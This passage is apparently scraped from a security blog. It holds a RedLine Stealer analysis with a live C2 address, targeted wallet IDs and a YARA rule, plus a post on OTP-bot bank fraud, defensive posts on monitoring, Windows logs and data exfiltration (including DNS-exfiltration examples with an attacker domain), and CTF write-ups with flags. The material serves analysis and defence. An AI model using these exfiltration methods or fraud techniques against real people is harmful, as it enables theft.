CultureInfo.CurrentCulture property.\nIt then gets the English name of the region for the current culture info using the RegionInfo class.\nWe can analyze EnviromentChecker method to see where its being called, after I analyzed it. It being used by Program.Main. So the purpose of it is to check if the current environment is located in the blocked countries list so it will exit the application\nC2 Communication The purpose of this method is to establish a connection to a remote to net.tcp://\u0026quot; + c2 + \u0026quot;/\u0026quot; and authorize the connection with an authentication token. The result variable is used to indicate whether the connection was successful or not.\nCollecting information In this stage the malware is collecting information about the host and these are the methods and their sort of data collection\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Total of RAM Get Processors info Get Graphic Cards info List Of Processes Discord tokens Get OpenVPN, PorotnVPN and NordVPN Data machine user name Windows Version Country Screenshot installed web browsers installed programs Telegram Data FTP Credentials All Crypto Wallets Virtual Display Size Moz Cookies Steam data Serial Number ChromeGetLocalName Crypto Stealer The malware is trying to steal the cryptocurrency wallets from Browsers Extensions\nAfter decoding it using CyberChef I could see a list of crypto wallets\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet blnieiiffboillknjnepogjhkgnoapac|EqualWallet cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet kncchdigobghenbbaddojjnnaogfppfj|iWallet amkmjjmmflddogmhpjloimipbofnfjih|Wombat fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet aeachknmefphepccionboohckonoeemg|Coin98Wallet cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain bfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom fhilaheimglignddkjgofkcbgekhenbh|Oxygen mgffkfbidihjpoaomajlbgchddlicgpn|PaliWallet aodkkagnadcbobfpggfnjeongemjbjca|BoltX kpfopkelmapcoipemfendmdcghnegimn|LiqualityWallet hmeobnfnfcmdkdcmlblgagmfpfboieaf|XdefiWallet lpfcbjknijpeeillifnkikgncikgfhdo|NamiWallet dngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet ffnbelfdoeiohenkjibnmadjiehjhajb|YoroiWallet ibnejdfjmmkpcnlpebklmnkoeoihofec|Tronlink jbdaocneiiinmjbjlgalhcelgbejmnid|NiftyWallet nkbihfbeogaeaoehlefnkodbefgpgknn|Metamask afbcbjpbpfadlkmhmclhkeeodmamcflc|MathWallet hnfanknocfeofbddgcijnmhnfnkdnaad|Coinbase fhbohimaelbohpjbbldcngcnapndodjp|BinanceChain odbfpeeihdkbihmopkbjmoonfanlbfcl|BraveWallet hpglfhgfnhbgpjdenjgmdgoeiappafln|GuardaWallet blnieiiffboillknjnepogjhkgnoapac|EqualWallet cjelfplplebdjjenllpjcblmjkfcffne|JaxxxLiberty fihkakfobkmkjojpchpfgcmhfjnmnfpi|BitAppWallet kncchdigobghenbbaddojjnnaogfppfj|iWallet amkmjjmmflddogmhpjloimipbofnfjih|Wombat fhilaheimglignddkjgofkcbgekhenbh|AtomicWallet nlbmnnijcnlegkjjpcfjclmcfggfefdm|MewCx nanjmdknhkinifnkgdcggcfnhdaammmj|GuildWallet nkddgncdjgjfcddamfgcmfnlhccnimig|SaturnWallet fnjhmkhhmkbjkkabndcnnogagogbneec|RoninWallet aiifbnbfobpmeekipheeijimdpnlpgpp|TerraStation fnnegphlobjdpkhecapkijjdkgcjhkib|HarmonyWallet aeachknmefphepccionboohckonoeemg|Coin98Wallet cgeeodpfagjceefieflmdfphplkenlfk|TonCrystal pdadjkfkgcafgbceimcpbkalnfnepbnk|KardiaChain bfnaelmomeimhlpmgjnjophhpkkoljpa|Phantom fhilaheimglignddkjgofkcbgekhenbh|Oxygen mgffkfbidihjpoaomajlbgchddlicgpn|PaliWallet aodkkagnadcbobfpggfnjeongemjbjca|BoltX kpfopkelmapcoipemfendmdcghnegimn|LiqualityWallet hmeobnfnfcmdkdcmlblgagmfpfboieaf|XdefiWallet lpfcbjknijpeeillifnkikgncikgfhdo|NamiWallet dngmlblcodfobpdpecaadgfbcggfjfnm|MaiarDeFiWallet bhghoamapcdpbohphigoooaddinpkbai|Authenticator ookjlbkiijinhpmnjffcofjonbfbgaoc|TempleWallet VPN Stealer The malware is collecting OpenVPN, and ProtonVPN credentials.\nProtonVPN OpenVPN NordVPN FTP Credentials The malware is stealing FTP credentials from FileZilla application and it is a free FTP solution not only supports FTP, but also FTP over TLS (FTPS) and SFTP. it reads data from XML files and returns them as a List of objects. Host + Port : Username + Pass\nStealing Cookies The malware targets Mozilla cookies and it tries to steal it from cookies.sqlite. The method reads data from a SQLite database file located \u0026lt;cookies.sqlite\u0026gt; in the directory specified by the profile parameter. If the file exists, the method reads data from the moz_cookies table\nIOCs Indicator Type Value Packed sha256 dd14b18a44ef6ac49edfe5952d5fd8d5c83fc887d405e97da15e572ed092b221 Unpacked sha256 F08B496CB7301A722ED2A9D2690D70E0400F1DD8E648F6BB0ADEBDBD1EEE1B16 C2 Server 89.22.231.25:45245 Yara Rule rule redline_infostealer{ meta: author = \u0026quot;R1ddl3\u0026quot; Description = \u0026quot;Yara rule for detecting unpacked RedLine Info Stealer\u0026quot; sha256 = \u0026quot;F08B496CB7301A722ED2A9D2690D70E0400F1DD8E648F6BB0ADEBDBD1EEE1B16\u0026quot; strings: $mz = {4D 5A}\t// PE file $str1 = \u0026quot;Steamboats\u0026quot; $str2 = \u0026quot;StringDecrypt\u0026quot; $str3 = \u0026quot;AllWallets\u0026quot; $str4 = \u0026quot;net.tcp://\u0026quot; $str5 = \u0026quot;ChromeGetLocalName\u0026quot; $str6 = \u0026quot;SystemInfoHelper\u0026quot; $str7 = \u0026quot;ea9464d486a641bb513057e5f63399e1\u0026quot; $str8 = \u0026quot;scannerArg\u0026quot; condition: ($mz at 0) and (6 of ($str*)) } ","permalink":"https://r1ddll3.github.io/malware-analysis/redlinestealer/","summary":"RedLine Stealer is capable of gathering information such as logins, passwords, autofill data, cookies and credit card details from all Gecko-based and Chromium-based web browsers. Cyber criminals can misuse this information to access various accounts (e.g., social media, email, banking-related accounts, cryptocurrency wallets).\nThe list of wallets targeted by RedLine stealer includes Armory, AtomicWallet, BitcoinCore, Bytecoin, DashCore, Electrum, Ethereum,and Jaxx. Targeted VPN clients are ProtonVPN, OpenVPN, and NordVPN.\nI will be analyzing the obfuscated sample.","title":"Full Analysis - RedLineStealer"},{"content":"Hello folks, I will talk about nowadays technique that (spammers) use to scam the victims and get their Bank OTP-Code\nfrom several years websites were using (2D Payment Gateway) because (2D Payment Gateway) processes payments after cardholders enter their personal card information along with the CVV, the connection is between the (Buyer) and (online seller).\nafter (3D Payment Gateway) came, most of the websites started to use it because it\u0026rsquo;s similarly to a 2D payment gateway, but with an extra verification step that improves its security. An OTP (one time password) is generated before the amount is deducted from the card holder’s bank account.\nSo when the (spammers) steal your credit card they will face an obstacle while they purchasing something from websites that require (OTP-Code). so how they will override this obstacle. they are using (Voice Services API) like, Twilio, sinch, plivo, messagebird and Telnyx to make an OTP-BOT scripted by python or any other language like Nodejs and they host their bot on telegram to send commands and receive OTP-Codes.\nSo in this demo (btw it\u0026rsquo;s a real demo from a spammer\u0026rsquo;s group) one of them is showing his bot that calls victims as it from the bank and ask for the (OTP-Code), to enter it in the verification page while he is purchasing something or maybe getting the money out somehow.\nBasically, this technique involves in 2 parts\nPart 1 / Hunt for targets To begin with, the attackers require a target, hence they initiate phishing campaigns to reach their desired victims. They obtain email addresses of individuals who have accounts on popular e-commerce platforms like PayPal, Amazon, Apple, and the like by using dorks to locate SQL injection vulnerabilities specifically in shopping websites. A SQL Vulnerability scanner is then employed to identify vulnerable websites, which the attackers then exploit to extract customer email addresses. They utilize a tool called \u0026ldquo;Checker\u0026rdquo; that connects to an endpoint to validate whether the victim email is registered with the targeted company such as PayPal, ensuring that the victim does indeed have an account with the targeted platform. The attackers also gather email addresses by keeping track of any new site leaks and downloading the leaked data. Once they obtain credit card details, they move on to part two.\nPart 2 / Building The BOT Once the attackers acquire the victim\u0026rsquo;s information, they create an OTP-Bot. The structure of the Bot is fairly straightforward, and they use Python or Nodejs to develop it. The choice between Python and Nodejs depends on whether the Bot will be hosted on Telegram or Discord. Python is used for Telegram, while Nodejs is used for Discord. The Bot\u0026rsquo;s structure consists of a sqlite3 database file and Voice Scripts. The database serves the purpose of identifying which users and admins have access to the Bot, as well as subscriptions. The Voice Scripts, on the other hand, are the messages that the Bot will deliver to the victim. Commonly used voice scripts are typically available in both English and French.\nSome samples of the Discord OTP-BOT\u0026rsquo;s structure and commands have been included for reference.\nAvailable Voices Voices.mp3 Config file – Thanks For Reading\n","permalink":"https://r1ddll3.github.io/threatintel/phishing_technique/","summary":"Hello folks, I will talk about nowadays technique that (spammers) use to scam the victims and get their Bank OTP-Code\nfrom several years websites were using (2D Payment Gateway) because (2D Payment Gateway) processes payments after cardholders enter their personal card information along with the CVV, the connection is between the (Buyer) and (online seller).\nafter (3D Payment Gateway) came, most of the websites started to use it because it\u0026rsquo;s similarly to a 2D payment gateway, but with an extra verification step that improves its security.","title":"New Phishing Technique"},{"content":"Hey folks, Today I will talk about: How We Can Monitor\nLet\u0026rsquo;s Dive in!!\nFirst of all Monitoring has 2 main types:\nEndpoints\nNetwork\nso what is the different between them and what data can I see from them.\nlet\u0026rsquo;s start with Network Monitoring:\nNetwork First we have to put some Questions to answer.\nDo you know which ports are actually in use? Which services are actually being used on those ports? Do you know which domains are being visited and by who? Can you detect malicious encrypted traffic? Can you see high-level bandwidth and traffic flow? You Should be noticed we\u0026rsquo;re talking about network analyze.\nSo how do we get the answer?\nHere comes NSM\u0026rsquo;s role and it stands for Network Security Monitoring\nWhat is Network Security Monitoring? Network security monitoring is an automated process that monitors network devices and traffic for security vulnerabilities, threats, and suspicious activities also it involves collecting and analyzing data, which in turn give companies the opportunity to detect and respond to intruders in their network.\nwe can basically say with Network Security Monitoring we can know\nWho is talking to Who what they are saying and what type of service they are actually using.\nWhat are the benefits of (NSM)? Analyzing network traffic.\nServices: DNS, HTTP(S), SMB, RDP, FTP, SSH, etc.\nIdentifying risky / compromise-like behavior\nExploit Delivery Internal recon and pivoting Command \u0026amp; Control (C2) Traffic Data Exfiltration Executable content transfer NSM By Layer Layer 3 \u0026amp; 4\nNetFlow, Firewall Logs, Statistical Data Layer 7\nService Logs Packet Capture, IDS alerts NSM Event Collection Points and Formats Why we need NSM? You can read this article Link\nEndpoints Also with Endpoints Monitoring we should put some Questions to answer.\nThe Questions Are:\nHas anyone installed unauthorized program? What Ports are listening and why? What exploits are you vulnerable to? Have any system files been changed? Have any malicious scripts been run.? You should be noticed we\u0026rsquo;re talking about Computers, Clouds, Servers\nSo how do we get the answer?\nHere comes CSM\u0026rsquo;s role and it stands for Continuous Security Monitoring or you can call it ISCM as NIST definition, so what is it?\nWhat is the Continuous Security Monitoring? Continuous Security Monitoring (CSM) is a strategy that automates the process of continuously checking and evaluating your operational security. The idea behind this approach is to enable you to identify vulnerabilities and fix them before cybercriminals exploit them.\nAlso you can read the Definition of NIST\nWhat are the benefits of CSM? it is looking at endpoint data \u0026ndash; \u0026ldquo;data at rest\u0026rdquo; or the data being generated on the endpoint Provides real-time visibility into your applications and infrastructure Vulnerability scanning File/Registry integrity monitoring Autoruns Services Running process Classifies devices: to allow you to implement preventive measures CSM Event Collection Here are the CSM Event Collection Sources:\nOS/Application auth logs Sysmon Antivirus EDR Whitelisting HIDS/HIPS Vulnerability Scanner How Does CSM Work? Continuous monitoring solutions work by providing real-time information about an organization\u0026rsquo;s security posture. According to the National Institute of Standards and Technology\u0026rsquo;s white paper NIST SP 800-137, information security continuous monitoring (ISCM) works by\nMaintaining situational awareness of all systems across the organization and its vendor ecosystem Maintaining an understanding of threats and threat activities Assessing all security controls Collecting, correlating, and analyzing security-related information Providing actionable communication of security status across all tiers of the organization; and Active management of risk by organizational officials. Integration of information security and risk management frameworks. The NIST Cybersecurity Framework breaks down the entire process into the following core components:\nIdentification Protection Detection Response Recovery Why we need CSM? Investigations will require network \u0026amp; endpoint data\nFor Example: Malware Infection occurs\nTraffic is generated to an IP on port 443\nWhile investigation with network data maybe you will see the bad IP or the bad domain for example..?\nbut what if you know that these processes created it now you see the process tree calc.exe | PID: 2092 and this calc.exe start cmd.exe of course this is not looking good? now we identified that this a persistence technique also now we know where is the file on the drive. Monitoring Data Sources Table NSM Data CSM Data Routers \u0026amp; Switches Authentication Network Firewalls Antivirus IDS \u0026amp; IPS HIDS \u0026amp; HIPS Proxy Process CommandLine WAF Data Loss Prevent (DLP) Service Logs: FTP,SSH,HTTP(S),etc. Vulnerability Scanners Application access logs Executables Finally there is a one place to search and alert on events is your SIEM\nBOUNS How Data Gets to The SIEM\nThis a small photo shows how (NSM) AND (CSM) are working with SIEM\nResources I Used:\nSANS \u0026ndash;\nlogrhythm \u0026ndash;\nNIST \u0026ndash;\n\u0026ndash; Thanks For Reading..\n","permalink":"https://r1ddll3.github.io/dfir/soc-tips/nsm-and-csm/","summary":"Hey folks, Today I will talk about: How We Can Monitor\nLet\u0026rsquo;s Dive in!!\nFirst of all Monitoring has 2 main types:\nEndpoints\nNetwork\nso what is the different between them and what data can I see from them.\nlet\u0026rsquo;s start with Network Monitoring:\nNetwork First we have to put some Questions to answer.\nDo you know which ports are actually in use? Which services are actually being used on those ports?","title":"How Can We Monitor"},{"content":"Hey folks, Today i will talk about How Windows Logging Work\nLet\u0026rsquo;s Dive in!!\nFirst of all we should know the Importance of Understanding Log Collection.\nwe know that log collection is SIEM\u0026rsquo;s duty but as an analyst that want to improve his capability you should know how your windows store these logs and how to see it real-time and how to read it\u0026hellip;etc\n1- improve your capability as an analyst not just an analyst who uses some tools without know the root about these tools.\n2- Understanding logs is understanding the available tools.\nso let\u0026rsquo;s get back to answer the question:\nLogs are records of events that happen in your computer, either by a person or by a running process. They help you track what happened and troubleshoot problems.\nEvent Viewer The Windows Event Logs are not text files that can be viewed using a text editor. However, the data are XML-formatted .evtx files and they stored in C:\\Windows\\System32\\winevt\\Logs\n- Note: File must be interpreted with tool - Cannot read directly like linux log text files There are 3 main ways of accessing these event logs within a Windows system:\nEvent Viewer (GUI-based application) Wevtutil.exe (command-line tool) Get-WinEvent (PowerShell cmdlet) i will explain Event Viewer and Get-WinEvent, let\u0026rsquo;s talk about event viewer first\nwe can open it using windows search and type event viewer or you can right-click on windows icon and select event viewer or we can use CLI and type eventvwr.msc\nso after open event viewer we will see the following:\nEvent Viewer has an intuitive user interface. The main screen is divided into three sections:\nThe pane on the left provides a hierarchical tree listing of the event log providers and they called ( channels ). The pane in the middle will either display a general overview and summary or the events specific to a selected channel. The pane on the right is the actions pane. 1- Channels Pane The Channels pane is where you choose the event log to view. By default, there are five channels of Windows logs More info Microsoft :\nApplication – Information logged by applications hosted on the local machine.\nSecurity – Information related to login attempts (success and failure), elevated privileges, and other audited events.\nSetup – Messages generated when installing and upgrading the Windows operating system. If the Windows system is a domain controller, those messages are also logged here.\nSystem – Messages generated by the Windows operating system.\nForwarded Events – Events forwarded by other computers when the local machine is functioning as a central subscriber.\nThere is also a section for Applications and Services Logs, including channels for Hardware Events, Internet Explorer and Windows PowerShell events, windows defender events..etc, you better take a look by yourself.\nactually these channels are files they are .evtx files stored in your system you can try to read them by right-clicking on any channel then choose properties you will see all the details about the channel\nOne other thing you should know before dive into next pane, What is the Windows Log Path?\nFrom prev photo we noticed that there is something in the middle called Windows Event Log Service, this the service that allowed the windows to record all your logs so if you want to know if it enabled or no you can check it by typing Services in windows search and navigate to windows event log and you should see the following\nif you noticed it is enabled by default and in the left the description of the service and what it does,\nafter gets the data will filter the data based on their channels and we have discussed the channels\u0026hellip; for example: found a logon attempt so it will put the log in the security channel because this channel is holding the logon attempts success and failure and so on\u0026hellip; Let\u0026rsquo;s Continue\n2- Detail pane There are 5 types of events that can be logged. Below is a table from docs.microsoft.com providing a brief description for each.\nEach event has a type Level:\nFocus your attention on the middle pane. Remember from earlier that this pane will display the events specific to a selected provider In this case, Security Channel.\nselect security channel.\nThis section has 2 tabs: General and Details.\nGeneral is the default view, and the rendered data is displayed. The Details view has 2 options: Friendly view and XML view. in XML view this what the log actually looks like, and if you want to see the real fields that your SIEM agent will picking up and dealing with they are inside XML view\nNow Let\u0026rsquo;s Dive into Practical Example. as an analyst i want to see the logon attempts that will happen on my PC either success and failure\nFirst thing i have to know what Information Gets Written, to know if it configured or not, these are the sources the logs getting written from\nas I said I want to know the logon attempts so from prev photo i should go to Local Security Policy and search for logon service to configure it to audit the logon attempts:\nit is not configured so i have to configure it: right-click on it then properties\nfirst let\u0026rsquo;s navigate to explain section to see what is does it allows me to audit all events that are belong to logon attempts on the computer\u0026hellip; that what we\u0026rsquo;re looking for, next thing is to configure it on success and failure attempts from policy section.\nmark this 2 options to audit success and failure and now let\u0026rsquo;s try to login\nthere are no logs yet now i will lock my pc and try to login but i will type wrong password 1 time to see the both success and failure logs.\nnow i got a lot of logs\nNote: success and failure each of them has a unique EventID that you can use it to get all the events related to them\nthis a list of Microsoft Event IDS Microsoft\nEvent ID Potential Criticality Event Summary 4624 Low An account was successfully logged on. 4625 Low An account failed to log on. now i can use 4625 to see the failure login attempts.\ni got 1 log after filtering the logs which includes these details Failure Reason: is reason that happened to make the process failed like in login i typed wrong password, take a look at all the highlighted texts and understand it well.\nnow time to see the success log details using this event id: 4624\ni got many more logs but we will depend on the time\nIf you noticed i highlighted common thing between them something called: Logon Type: 5 or 2\nwhat is the logon type then: the type of logon which was performed. The table below contains the list of possible values for this field.\nI Will Leave to You the Last pane discover it by yourself and now let\u0026rsquo;s move to something else\nNew Scheduled Task Event ID: 4698 Event ID Potential Criticality Event Summary 4698 Low A scheduled task was created. 4699 Low A scheduled task was deleted. 4700 Low A scheduled task was enabled. 4701 Low A scheduled task was disabled. 4702 Low A scheduled task was updated. Service Creation: Windows Event ID 7045 Actually this Event ID is not listed in Microsoft Events ID but Service Creation is another way the attackers use for persistence or use the computer resources for mining cryptocurrency\nUSB Plug \u0026amp; Play: Event ID 6416 In order to track if there is any devices that plugged in into your PC follow those steps:\n1- Enable the USB Logging option by accessing the Event Viewer:\nBy going to Local Security Policy read the explain first to know what is does and then enable success and failure\nnow back to event viewr and use the Event ID\nWindows Defender: Event IDs 1006 / 1116 This an example for windows defender when i ran a malicious file on my pc and i was enable real-time protection windows defender made an alert and log this event you can see windows defender logs from\nApplications and Services Logs \u0026gt; Microsoft \u0026gt; Windows \u0026gt; Windows Defender \u0026gt; Operational\nPowerShell Logs: Windows Event ID 4104 So First we need to turn audit policy on by follow those steps:\n1- go to edit group policy \u0026gt; Administrative Templates \u0026gt; Windows Components \u0026gt; Windows PowerShell\n2- we will pick Turn on PowerShell Script Block Logging\nthen turn it on like this\nafter this back to event viewer and navigate to Applications and Services Logs \u0026gt; Microsoft \u0026gt; Windows \u0026gt; PowerShell \u0026gt; Operational to see the logs, once you opened the powershell and filter the logs by its event id yo\u0026rsquo;ll notice that there is a log has fade in it tells you powershell opened\nthen write any command in my case i will use whoami\nBONUS if you arrived here, i want to tell you good job you made a big progress :D\nLast thing in this topic about Get-WinEvent PowerShell Command\nIf you want to get Details For Specific Event ID you can use the following commands:\n$logs = Get-WinEvent -ListProvider Microsoft-Windows-Security-Auditing then:\n$logs.events | where-object {$_.id -eq EVENT_ID} | fl * \u0026ndash; Don\u0026rsquo;t Forget to Replace EVENT_ID with the event id that you want to get data about.\nChannels of Interest for the analyst Mapping ATT\u0026amp;CK to Windows Event IDs Indicators of attack (IOA) uses security operations to identify risks and map them to the most appropriate attack. In order to address different security scenarios with your SIEM, the link below maps Windows Event ID by tactic and technique.\n©️ Author/Credits: @mdecrevoisier\nEVTX-to-MITRE-Attack\nSummary \u0026ndash; Resources i used for this topic\nSANS loggly Microsoft \u0026ndash; Thanks For Reading..\n\u0026ndash; Wait For Part 2 More Details Kerberos Authentication\n","permalink":"https://r1ddll3.github.io/dfir/soc-tips/windows-logging/","summary":"Hey folks, Today i will talk about How Windows Logging Work\nLet\u0026rsquo;s Dive in!!\nFirst of all we should know the Importance of Understanding Log Collection.\nwe know that log collection is SIEM\u0026rsquo;s duty but as an analyst that want to improve his capability you should know how your windows store these logs and how to see it real-time and how to read it\u0026hellip;etc\n1- improve your capability as an analyst not just an analyst who uses some tools without know the root about these tools.","title":"How Windows Logging Work"},{"content":"Hey folks, Today we will talk about how to Spot Data Exfiltration\nLet\u0026rsquo;s Dive in!!\nFirst of all we should know what is data exfiltration. according to MITRE ATT\u0026amp;CK® Data Exfiltration is the Step when The adversary is trying to steal data may use to steal data from your network.\nThis could be done over Web Service, over USB, over Cloud Storage, Emails and many more, you can read more about it Resource\nFirst i left you some samples of how the exfiltration done with some of Exfiltration Methods not all of course but i will leave you more sources to dig deep into the topic.\nExfiltrate via HTTP Exfiltrate via SMTP SMTP is one of the most common methods for data exfiltration. Several malware programs exfiltrate the stolen information to an attacker-controlled SMTP server. For example Agent Tesla is a Windows-based keylogger and Remote Access Trojan (RAT) commonly uses SMTP to exfiltrate stolen data.\nAttackers can use the following PowerShell code to send an email with an attached file (stolen data) to exfiltrate a remote address:\nStream Exfiltrate via DNS Since DNS is not a transport protocol, many organizations don\u0026rsquo;t regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications.\nThe DNS protocol has limitations that need to be taken into consideration, which are as follows,\nThe maximum length of the Fully Qualified FQDN domain name (including .separators) is 255 characters. The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc). Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000 DNS requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.\nThe attacker registers the domain name ZG5ZC2VJDXJPDHKK.COM, and sets up name server NS1.ZG5ZC2VJDXJPDHKK.COM The infected client encodes stolen information, in this case, the text Pa$$w0rd, into UGEKJHCWCMQK The client makes the DNS query for the domain with the encoded password as a subdomain: UGEKJHCWCMQK.ZG5ZC2VJDXJPDHKK.COM A recursive name server finds the authoritative name server NS1.ZG5ZC2VJDXJPDHKK.COM and sends the query there. The attacker recognizes the subdomain value as the encoded password. The attacker decodes the information UGEKJHCWCMQK back to recover Pa$$w0rd Diagram: Then the attacker receives the encoded data and decode it to get the sensitive data.\nExfiltrate via DNS Tunneling DNS tunneling is a difficult-to-detect attack that routes DNS requests to the attacker\u0026rsquo;s server, providing attackers a covert command and control channel, and data exfiltration path.\nThe Client has a Firewall, IDS and proxies that are inspecting and blocking the susp traffic so how can they move the data?\nYes, they will abuse the DNS Protocol to create a covert channel and exfiltrate the sensitive data out.\nSo How this works:\nThe Attacker established a domain with local DNS Server. Attacker Will try to query his DNS server from the client machine so what happens is when the client tries and goes to this website it will passed through local DNS and this DNS Server probably doesn\u0026rsquo;t know the IP Address of the attacker\u0026rsquo;s website so it will query this website and ask for the IP Address of it and the website will respond with the IP Address. since the queries are just packets so the attacker can manipulate it the attacker puts the sensitive data into the query and send it splitted so he won\u0026rsquo;t get caught. and finally attacker receive it and reconstruct it and get his sensitive data Exfiltrate via IPv6 shows the ‘IPv6teal receiver script’ running on the attacker-controlled machine; it is trying to listen and capture the targeted data: You Will Find More Examples: exfiltration-attacks Detecting Data Exfiltration so we are talking about transferring data so first thing is to check the volume of the data that being transfer over your network\nMonitor High-Volume DNS tunneling or High-Volume Traffic being from unusual source but it is not should be 100% with high-volume.\na connection to unknown destination (C2) maybe\nAlso, you have to check Process Creation Logs, maybe they compressed archive especially from CLI with password or 7z, WinRAR\nPay attention to DLP, UEBA alerts the following file types to bypass DLP so take care:\nPlain Zip Password protected (AES) Zip Deeply nested Zips (many systems will stop scanning after 10-100 to avoid Zip Bombs) 7zip RAR CAB Tar (+/- gzip) WIM image check multiple port firewall denies outbound from a single source\nComplex URLs or Unexplained URLs with long parameters\n1 http://ooo.nu6tgnzvgm2tmmbzgq4a.rkgo---redacted---tw5.5z5i6fjnugmxfowy.beevish.com/xml.php?c=0\u0026amp;t=x\u0026amp;k=.txt\u0026amp;type=0\u0026amp;s=3500\u0026amp;n=example.txt They use Complex URLs to exfiltrate they data just to make you a bit blind or confused about the URL you will think a safe URL with params just like Microsoft URLs it has a long parameters but in fact they maybe carrying out some data\nMonitoring for outbound traffic patterns:- as malware needs to regularly communicate with C2 servers to maintain a consistent connection. Continuous monitoring provides opportunities to detect data exfiltration with common protocols such as HTTP:80 or HTTPS:443. It’s worth keeping in mind that some advanced malware randomize delays between C2 communications.\nKeeping an up-to-date log of all approved IP addresses connections to compare against all new connections: Along with this, it’s advised to keep an eye out for large data flows to unexpected IP addresses and major spikes in anomalous outbound traffic.\nBlock unauthorized communication channels: First, disable all unauthorized communication channels, ports and protocols by default, and re-enable on an as-needed basis.\nData Loss Prevention (DLP): Data loss prevention (DLP) is a strategy for detecting and preventing data exfiltration or data destruction. Many DLP solutions analyze network traffic and internal \u0026ldquo;endpoint\u0026rdquo; devices to identify the leakage or loss of confidential information. Organizations use DLP to protect their confidential business information and personally identifiable information (PII), which helps them stay compliant with industry and data privacy regulations.\nResources I used for this Article:\nattack.mitre.org blog.apnic.net www.sans.org \u0026ndash; Thanks For Reading.\n","permalink":"https://r1ddll3.github.io/dfir/soc-tips/data-exfiltration/","summary":"Hey folks, Today we will talk about how to Spot Data Exfiltration\nLet\u0026rsquo;s Dive in!!\nFirst of all we should know what is data exfiltration. according to MITRE ATT\u0026amp;CK® Data Exfiltration is the Step when The adversary is trying to steal data may use to steal data from your network.\nThis could be done over Web Service, over USB, over Cloud Storage, Emails and many more, you can read more about it Resource","title":"Spotting Data Exfiltration"},{"content":" Challenge Name: Bus\nPoints: 150\nThe Challenge was a [ PCAP File ], hmm don\u0026rsquo;t like to analyze these types but it\u0026rsquo;s okay let\u0026rsquo;s dive in!\nFirst thing let\u0026rsquo;s open it in Wireshark and see the traffic.\nas usual messy traffic xd, let\u0026rsquo;s take a look at traffic that look at modbus protocol there’s nothing interesting in this protocol except the Data section.\ni displayed them as a Column to make things more clear to me\nData are ff00 or 0000 0000 is represents 0 and ff00 represents 1 Like Signals\nso i used tshark to extract all the Data\ntshark -r bus.pcap -T fields -e modbus.data -Y \u0026ldquo;modbus.data != 0 and tcp.dstport == 502\u0026rdquo; \u0026gt; bus.txt\nby replacing every 0000 and ff00 to there 0 and 1 value i got the following\n011110010110111101110101011100100010000001000110010011000100000101000111001000000110100101110011001110100010000001001101011011110110010001100010011101010111001101011111011010010111001101011111011001010110000101110011011110010101111101100001011001100111010001100101011100100101111101100001011011000110110000100001 Great!, it\u0026rsquo;s a binary data, convert it CyberChef .\nFlag: BlackHatMEA{Modbus_is_easy_after_all!}\nThanks For Reading\n","permalink":"https://r1ddll3.github.io/ctfs/blackhatmea/forensics/bus/","summary":"Challenge Name: Bus\nPoints: 150\nThe Challenge was a [ PCAP File ], hmm don\u0026rsquo;t like to analyze these types but it\u0026rsquo;s okay let\u0026rsquo;s dive in!\nFirst thing let\u0026rsquo;s open it in Wireshark and see the traffic.\nas usual messy traffic xd, let\u0026rsquo;s take a look at traffic that look at modbus protocol there’s nothing interesting in this protocol except the Data section.\ni displayed them as a Column to make things more clear to me","title":"BlackHatMEA | Bus"},{"content":" Challenge Name: Mem\nPoints: 250\nThe Challenge was a [ RAW file ],\nit is a memory dump file, so our hero for this chall will be [ Volatility ]\nFirst thing as usual let\u0026rsquo;s start with the basic vol command\nbut i use vol3 so maybe you will notice the command is not like yours\nnothing useful i know but it just our routine while analyzing :D\nso our desc is saying that we are looking for a file, hmm let\u0026rsquo;s fire a scan for all the files\ni have extracted it and it is has a flag.txt but protected with a password\nso this what desc said about it we need this password to get our flag\nafter doin some analyze on the memory, process i noticed that the challenge said password stored locally so let\u0026rsquo;s dive into windows.envars\nby the following command\npython3 vol.py -f ../mem.raw windows.envars.Envars \u0026gt; vars.txt 300 csrss.exe 0x2e1930 SystemP Ittm1Fc7hcuFrLZIQmxs Bingo! This our Password Ittm1Fc7hcuFrLZIQmxs\nFlag: BlackHatMEA{Password_hints_are_the_retrievable}\nThanks For Reading\n","permalink":"https://r1ddll3.github.io/ctfs/blackhatmea/forensics/mem/","summary":"Challenge Name: Mem\nPoints: 250\nThe Challenge was a [ RAW file ],\nit is a memory dump file, so our hero for this chall will be [ Volatility ]\nFirst thing as usual let\u0026rsquo;s start with the basic vol command\nbut i use vol3 so maybe you will notice the command is not like yours\nnothing useful i know but it just our routine while analyzing :D\nso our desc is saying that we are looking for a file, hmm let\u0026rsquo;s fire a scan for all the files","title":"BlackHatMEA | 